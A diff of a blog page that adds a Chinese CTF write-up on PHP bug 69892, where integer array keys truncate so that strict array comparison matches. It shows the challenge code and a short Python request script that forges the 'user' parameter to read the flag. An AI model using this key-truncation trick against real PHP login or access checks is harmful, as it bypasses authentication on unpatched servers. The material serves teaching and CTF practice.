@@ -3,7 +3,7 @@
   <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
     
-    <title>tag: CTF | Xiao Leung&#39;s Blog</title>
+    <title>PHP整数键截断问题 | Xiao Leung&#39;s Blog</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     
     
@@ -74,47 +74,86 @@
 <!--文章列表-->
 <div class="wrapper">
   
-    <ul class="posts-list mb+ js-posts">
-      
-                <!--<div class="type">
-          <div class="mask">
-            <i class="iconfont"></i>
-          </div>
-          </div>-->
-        <li class="post">
-          
-            <i class="post-status iconfont icon-icon"></i>  
-          
-          <h2 class="no-background"  >
-            <span><a href="/2019/08/09/上传漏洞&文件包含总结/">上传漏洞&amp;文件包含总结</a></span>
-            <time class="post-time" datetime="2019-08-09T02:05:54.000Z" itemprop="datePublished">2019-08-09</time>
-          </h2>
-        </li>
-      
-                <!--<div class="type">
-          <div class="mask">
-            <i class="iconfont"></i>
-          </div>
-          </div>-->
-        <li class="post">
-          
-          <h2 class="no-background"  >
-            <span><a href="/2019/08/04/SQl注入学习笔记/">SQL注入学习笔记</a></span>
-            <time class="post-time" datetime="2019-08-04T02:05:54.000Z" itemprop="datePublished">2019-08-04</time>
-          </h2>
-        </li>
-      
-    </ul>
-    
-      <div class="pagination mb+ js-pagination">
-        <div class="js-next pagination__load">
-            
-        </div>
-    </div>
-    
+    <!--文章-->
+<article>
+	
+  
+    <h1 class="post-title" itemprop="name">
+      PHP整数键截断问题
+    </h1>
+  
+
+	<div class='post-body mb'>
+		<ul>
+<li><p>漏洞详情</p>
+<p> <a href="https://bugs.php.net/bug.php?id=69892" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=69892</a> </p>
+</li>
+<li><p>影响版本</p>
+<p> 5.4.0 - 5.4.43, 5.5.0 - 5.5.26, 5.6.0 - 5.6.10, 7.0.0alpha1 </p>
+</li>
+</ul>
+<pre><code class="php">&lt;?php
+include(&quot;flag.php&quot;);
+
+if(empty($_GET[&#39;user&#39;])) die(show_source(__FILE__));
+$a= strval(time());
+$user = [&#39;admin&#39;,$a];
+if($_GET[&#39;user&#39;] === $user &amp;&amp;$_GET[&#39;user&#39;][0]!=&#39;admin&#39;){
+    echo $flag;
+}
+?&gt;</code></pre>
+<p>我们直接看漏洞详情，这样比较会直接相等：</p>
+<pre><code class="php">var_dump([0 =&gt; 0] === [0x100000000 =&gt; 0]);</code></pre>
+<p>测试发现将0x10000000转换为10进制： 4294967296 ，逻辑依然成立。</p>
+<p>上题直接构造exp:</p>
+<pre><code class="python">import requests
+import time
+
+url =&quot;http://xxxxxx.xx/?user[4294967296]=admin&amp;user[1]=&quot;+str(int(time.time()))
+result = requests.get(url)
+print(url)
+print(result.text)</code></pre>
+<p>需要注意的是，这个问题只能在64位PHP中复现成功，在32位中会将传入的4294967296解析为字符串导致匹配错误。</p>
+
+	</div>
+	<div class="meta split">
+		
+			<span>本文总阅读量 <span id="busuanzi_value_page_pv"></span> 次</span>
+		
+		<time class="post-date" datetime="2019-10-25T15:28:01.000Z" itemprop="datePublished">2019-10-25</time>
+	</div>
+</article>
+
+<!--评论-->
+
+	
+<div class="ds-thread" data-thread-key="2019-10-25-PHP整数键截断问题" data-title="PHP整数键截断问题" data-url="http://www.plasf.cn/2019/10/25/2019-10-25-PHP整数键截断问题/"></div>
+<script type="text/javascript">
+
+var duoshuoQuery = {short_name:"yumemor"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0]
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+</script>
+
 
   
 </div>
+
+
+  <svg id="bigTriangleColor" width="100%" height="40" viewBox="0 0 100 102" preserveAspectRatio="none">
+    <path d="M0 0 L50 100 L100 0 Z"></path>
+  </svg>
+
+  
+
+
+  <div class="wrapper"></div>
 
 
 
